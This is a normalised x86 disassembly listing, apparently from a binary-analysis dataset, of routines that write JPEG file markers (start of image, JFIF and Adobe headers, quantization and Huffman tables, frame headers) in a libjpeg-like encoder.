mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x28 ]
add ecx [ eax + edx * 4 ]
mov edx [ ebp - 0x1c ]
xor eax eax
mov al [ edx + ecx ]
mov ecx [ ebp - 0x8 ]
add ecx eax
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x10 ]
mov cl [ ebp - 0x8 ]
mov [ eax ] cl
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x30 ]
add eax 0x1
and eax 0xf
mov [ ebp - 0x30 ] eax
jmp r-xdata
mov ecx [ ebp - 0x34 ]
add ecx 0x1
mov [ ebp - 0x34 ] ecx
mov eax [ ebp - 0x38 ]
sub eax 0x1
mov [ ebp - 0x38 ] eax
sub_42a120
push ebp
mov ebp esp
sub esp 0x90
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a8 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
mov [ ebp - 0x34 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x5c ]
mov [ ebp - 0x4c ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x120 ]
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x44 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x44 ]
cmp eax [ ebp + 0x14 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4c ]
push ecx
mov edx [ ebp - 0x44 ]
mov eax [ ebp + 0x10 ]
mov ecx [ eax + edx * 4 ]
push ecx
call sub_420d70
add esp 0x8
mov [ ebp - 0x40 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x40 ]
cmp eax [ ebp - 0x34 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov cl [ eax + 0x54 ]
neg ecx
sbb ecx ecx
inc ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] cl
jmp r-xdata
mov ecx [ ebp - 0x44 ]
mov edx [ ebp + 0xc ]
mov eax [ edx + ecx * 4 ]
add eax [ ebp - 0x40 ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x44 ]
mov edx [ ebp + 0x10 ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + 0x54 ]
test edx edx
je r-xdata
mov edx [ ebp - 0x44 ]
add edx 0x1
mov [ ebp - 0x44 ] edx
mov [ ebp - 0x38 ] 0x1
mov edx [ ebp - 0x34 ]
mov [ ebp - 0x3c ] edx
mov eax [ ebp - 0x40 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + eax * 4 + 0x44 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x4c ]
sub eax 0x1
imul eax [ ebp - 0x34 ]
mov ecx [ ebp - 0x20 ]
add ecx eax
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x24 ]
lea ecx [ eax + edx - 0x1 ]
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x38 ] 0xffffffff
mov edx [ ebp - 0x34 ]
neg edx
mov [ ebp - 0x3c ] edx
mov eax [ ebp - 0x40 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + eax * 4 + 0x44 ]
mov eax [ ebp - 0x4c ]
lea ecx [ edx + eax * 2 + 0x2 ]
mov [ ebp - 0x1c ] ecx
jmp r-xdata
cmp [ ebp - 0x48 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x18 ]
mov edx [ ebp - 0x40 ]
mov eax [ ecx + edx * 4 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
mov eax [ ebp - 0x40 ]
mov ecx [ edx + eax * 4 ]
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x10 ] 0x0
mov edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x48 ] eax
jmp r-xdata
mov ecx [ ebp - 0x1c ]
mov dx [ ebp - 0x10 ]
mov [ ecx ] dx
jmp r-xdata
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x1c ]
movsx ecx [ eax + edx * 2 ]
mov edx [ ebp - 0x8 ]
lea eax [ edx + ecx + 0x8 ]
sar eax 0x4
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x20 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x8 ]
add eax edx
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x50 ]
add ecx [ ebp - 0x8 ]
xor edx edx
mov dl [ ecx ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x8 ]
xor ecx ecx
mov cl [ eax ]
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x24 ]
mov al [ edx ]
add al [ ebp - 0x30 ]
mov ecx [ ebp - 0x24 ]
mov [ ecx ] al
mov edx [ ebp - 0x2c ]
add edx [ ebp - 0x30 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x8 ]
sub ecx eax
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x8 ]
shl eax 0x1
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x18 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x10 ]
add edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov [ eax ] dx
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x18 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x18 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x20 ]
add edx [ ebp - 0x3c ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x38 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x1c ]
lea eax [ edx + ecx * 2 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov edx [ ebp - 0x40 ]
add edx 0x1
mov [ ebp - 0x40 ] edx
mov ecx [ ebp - 0x48 ]
sub ecx 0x1
mov [ ebp - 0x48 ] ecx
sub_42a370
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x2e
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a3a0
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push 0x20
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x14c ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_42a5b0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] sub_42a820
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] sub_42ac40
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] sub_42b080
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] sub_42b0b0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x14 ] sub_42a430
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] sub_42a590
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a430
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
cmp [ ebp + 0x10 ] 0xfffd
jbe r-xdata
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_42a490
add esp 0x8
mov ecx [ ebp + 0x10 ]
add ecx 0x2
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_42a550
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0xb
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
sub_42a490
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
push 0xff
mov eax [ ebp + 0x8 ]
push eax
call sub_42a4d0
add esp 0x8
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_42a4d0
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a4d0
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
mov cl [ ebp + 0xc ]
mov [ eax ] cl
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x4 ]
sub eax 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call [ ecx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x18
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
sub_42a550
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
sar eax 0x8
and eax 0xff
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a4d0
add esp 0x8
mov edx [ ebp + 0xc ]
and edx 0xff
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_42a4d0
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a590
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a4d0
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a5b0
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14c ]
mov [ ebp - 0x4 ] ecx
push 0xd8
mov edx [ ebp + 0x8 ]
push edx
call sub_42a490
add esp 0x8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] 0x0
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0xc4 ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0xcc ]
test edx edx
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_42a620
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_42a730
add esp 0x4
sub_42a620
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
push 0xe0
mov eax [ ebp + 0x8 ]
push eax
call sub_42a490
add esp 0x8
push 0x10
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a550
add esp 0x8
push 0x4a
mov edx [ ebp + 0x8 ]
push edx
call sub_42a4d0
add esp 0x8
push 0x46
mov eax [ ebp + 0x8 ]
push eax
call sub_42a4d0
add esp 0x8
push 0x49
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a4d0
add esp 0x8
push 0x46
mov edx [ ebp + 0x8 ]
push edx
call sub_42a4d0
add esp 0x8
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_42a4d0
add esp 0x8
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0xc5 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_42a4d0
add esp 0x8
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0xc6 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_42a4d0
add esp 0x8
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0xc7 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_42a4d0
add esp 0x8
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0xc8 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_42a550
add esp 0x8
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0xca ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_42a550
add esp 0x8
push 0x0
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a4d0
add esp 0x8
push 0x0
mov edx [ ebp + 0x8 ]
push edx
call sub_42a4d0
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a730
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push 0xee
mov eax [ ebp + 0x8 ]
push eax
call sub_42a490
add esp 0x8
push 0xe
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a550
add esp 0x8
push 0x41
mov edx [ ebp + 0x8 ]
push edx
call sub_42a4d0
add esp 0x8
push 0x64
mov eax [ ebp + 0x8 ]
push eax
call sub_42a4d0
add esp 0x8
push 0x6f
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a4d0
add esp 0x8
push 0x62
mov edx [ ebp + 0x8 ]
push edx
call sub_42a4d0
add esp 0x8
push 0x65
mov eax [ ebp + 0x8 ]
push eax
call sub_42a4d0
add esp 0x8
push 0x64
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a550
add esp 0x8
push 0x0
mov edx [ ebp + 0x8 ]
push edx
call sub_42a550
add esp 0x8
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_42a550
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x40 ]
mov [ ebp - 0x4 ] edx
cmp [ ebp - 0x4 ] 0x3
je r-xdata
push 0x1
mov eax [ ebp + 0x8 ]
push eax
call sub_42a4d0
add esp 0x8
jmp r-xdata
cmp [ ebp - 0x4 ] 0x5
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x2
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a4d0
add esp 0x8
jmp r-xdata
jmp r-xdata
push 0x0
mov edx [ ebp + 0x8 ]
push edx
call sub_42a4d0
add esp 0x8
sub_42a820
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x44 ]
mov [ ebp - 0x10 ] ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ecx + 0x3c ]
jge r-xdata
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0xb1 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_42a9b0
add esp 0x8
mov ecx [ ebp - 0x8 ]
add ecx eax
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0xd4 ]
test edx edx
jne r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x10 ]
add eax 0x54
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0xb1 ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x38 ] 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0xd4 ]
test ecx ecx
je r-xdata
push 0xc9
mov edx [ ebp + 0x8 ]
push edx
call sub_42ab00
add esp 0x8
jmp r-xdata
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x44 ]
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
and eax 0xff
test eax eax
je r-xdata
push 0xc2
mov edx [ ebp + 0x8 ]
push edx
call sub_42ab00
add esp 0x8
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jge r-xdata
push 0xc1
mov edx [ ebp + 0x8 ]
push edx
call sub_42ab00
add esp 0x8
push 0xc0
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42ab00
add esp 0x8
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x10 ]
cmp [ ecx + 0x14 ] 0x1
jg r-xdata
mov eax [ ebp - 0xc ]
and eax 0xff
test eax eax
je r-xdata
mov [ ebp - 0xc ] 0x0
mov edx [ ebp - 0x10 ]
cmp [ edx + 0x18 ] 0x1
jle r-xdata
mov [ ebp - 0xc ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x4b
push 0x0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx + 0x4 ]
add esp 0x8
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
add ecx 0x54
mov [ ebp - 0x10 ] ecx
jmp r-xdata
sub_42a9b0
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x48 ]
mov [ ebp - 0x4 ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x34
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x18 ] ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
cmp [ ebp - 0xc ] 0x40
jge r-xdata
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov cl [ eax + 0x80 ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dx [ ecx + eax * 2 ]
cmp edx 0xff
jle r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0xdb
mov edx [ ebp + 0x8 ]
push edx
call sub_42a490
add esp 0x8
mov eax [ ebp - 0x8 ]
neg eax
sbb eax eax
and eax 0x40
add eax 0x43
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a550
add esp 0x8
mov edx [ ebp - 0x8 ]
shl edx 0x4
mov eax [ ebp + 0xc ]
add eax edx
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a4d0
add esp 0x8
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
cmp [ ebp - 0xc ] 0x40
jge r-xdata
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x80 ] 0x1
mov eax [ ebp - 0xc ]
mov ecx [ eax * 4 + r--data ]
mov edx [ ebp - 0x4 ]
xor eax eax
mov ax [ edx + ecx * 2 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
and eax 0xff
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a4d0
add esp 0x8
jmp r-xdata
mov ecx [ ebp - 0x10 ]
shr ecx 0x8
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_42a4d0
add esp 0x8
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
sub_42ab00
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a490
add esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x3c ]
imul eax eax 0x3
add eax 0x8
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a550
add esp 0x8
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0xffff
jg r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x29
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x18 ] 0xffff
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1c ] 0xffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
cmp ecx [ eax + 0x3c ]
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x38 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a4d0
add esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x20 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a550
add esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a550
add esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x3c ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a4d0
add esp 0x8
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ edx ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a4d0
add esp 0x8
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x8 ]
shl eax 0x4
mov ecx [ ebp - 0x8 ]
add eax [ ecx + 0xc ]
push eax
mov edx [ ebp + 0x8 ]
push edx
call sub_42a4d0
add esp 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_42a4d0
add esp 0x8
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx 0x54
mov [ ebp - 0x8 ] edx
sub_42ac40
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14c ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0xb1 ]
test eax eax
je r-xdata
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4318b0
add esp 0x4
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0xe4 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx [ eax + 0xbc ]
cmp edx [ ecx + 0x1c ]
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0xe8 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0xd4 ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42af20
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_42aed0
add esp 0x4
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xbc ]
mov [ ecx + 0x1c ] eax
push 0x0
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x14 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_42ad70
add esp 0xc
push 0x1
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x18 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_42ad70
add esp 0xc
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x12c ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
push 0x1
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x18 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_42ad70
add esp 0xc
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x134 ] 0x0
jne r-xdata
jmp r-xdata
jmp r-xdata
push 0x0
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x14 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_42ad70
add esp 0xc
jmp r-xdata
sub_42ad70
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
mov eax [ ebp + 0x10 ]
and eax 0xff
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0x58 ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 + 0x68 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
add ecx 0x10
mov [ ebp + 0xc ] ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + 0x111 ]
test edx edx
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x32
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp + 0xc ]
mov [ edx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0xc4
mov eax [ ebp + 0x8 ]
push eax
call sub_42a490
add esp 0x8
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] 0x10
jg r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x13
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_42a550
add esp 0x8
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_42a4d0
add esp 0x8
mov [ ebp - 0xc ] 0x1
jmp r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x8 ]
add ecx eax
mov [ ebp - 0x8 ] ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x10
jg r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
xor edx edx
mov dl [ ecx ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_42a4d0
add esp 0x8
jmp r-xdata
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x8 ]
jge r-xdata
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x111 ] 0x1
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0xc ]
xor ecx ecx
mov cl [ eax + 0x11 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_42a4d0
add esp 0x8
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
sub_42aed0
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
push 0xdd
mov eax [ ebp + 0x8 ]
push eax
call sub_42a490
add esp 0x8
push 0x4
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a550
add esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xbc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a550
add esp 0x8
pop edi
pop esi
